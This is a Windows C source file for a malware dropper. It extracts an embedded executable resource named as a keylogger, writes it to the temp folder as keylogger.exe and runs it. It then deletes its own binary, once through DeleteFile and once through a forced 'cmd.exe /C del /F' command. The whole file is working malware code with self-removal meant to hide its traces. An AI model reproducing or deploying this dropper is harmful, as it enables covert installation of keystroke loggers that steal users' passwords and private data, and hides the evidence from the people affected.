#include <Windows.h>
#include <Strsafe.h>
#include "resource.h"

#define BUFSIZE 1024

wchar_t delCmdFormat[BUFSIZE] = L"cmd.exe /C del /F \"%s\"";

void printError(wchar_t const* msg) {
	MessageBox(NULL, msg, L"ERROR", MB_OK | MB_ICONERROR);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	HRSRC hRes = NULL;
	HGLOBAL hBin = NULL;
	LPVOID pBin = NULL;
	DWORD binSize = 0;
	wchar_t buffer[BUFSIZE];
	wchar_t delCmd[BUFSIZE];

	// find resource
	if ((hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN_KEYLOGGER), L"BIN")) == NULL) {
		printError(L"In FindResource");
		return 1;
	}
	// load resource in memory
	if ((hBin = LoadResource(NULL, hRes)) == NULL) {
		printError(L"In LoadResource");
		return 1;
	}
	// get the size of resource
	if ((binSize = SizeofResource(NULL, hRes)) == 0) {
		printError(L"In SizeofResource");
		return 1;
	}
	// get the pointer of resource in memory
	if ((pBin = LockResource(hBin)) == NULL) {
		printError(L"In LockResource");
		return 1;
	}
	if ((*(PWORD)pBin) != 0x5A4D){
		printError(L"Embedded executable corrupted");
		return 1;
	}

	int len = GetTempPath(BUFSIZE, buffer);
	if (len >= BUFSIZE) {
		return 1;
	}
	wcscat_s(buffer, BUFSIZE - 1, L"keylogger.exe");
	
	// dump resource
	HANDLE hFile = NULL;
	DWORD nwrite = 0;
	DeleteFile(buffer);
	if ((hFile = CreateFile(buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == NULL) {
		printError(L"In CreateFile");
		return 1;
	}
	if (!WriteFile(hFile, pBin, binSize, &nwrite, NULL) || nwrite != binSize) {
		printError(L"In WriteFile");
		return 1;
	}
	CloseHandle(hRes);
	CloseHandle(hFile);

	// open new process
	STARTUPINFO sInfo;
	PROCESS_INFORMATION pInfo;

	ZeroMemory(&sInfo, sizeof(STARTUPINFO));
	ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));

	if (!CreateProcess(buffer, NULL,
		NULL, NULL, FALSE, 0, NULL, NULL, &sInfo, &pInfo)) {
		printError(L"In CreateProcess");
		return 1;
	}
	
	// delete itself 
	GetModuleFileName(NULL, buffer, BUFSIZE);
	// just guarantee truncating
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		return 1;
	}
	DeleteFile(buffer);

	if (StringCchPrintf(delCmd, BUFSIZE, delCmdFormat, buffer) != S_OK) {
		return 1;
	}
	// fail does not matter
	CreateProcess(NULL, delCmd,
		NULL, NULL, FALSE, 0, NULL, NULL, &sInfo, &pInfo);

	CloseHandle(pInfo.hThread);
	CloseHandle(pInfo.hProcess);
	return 0;
}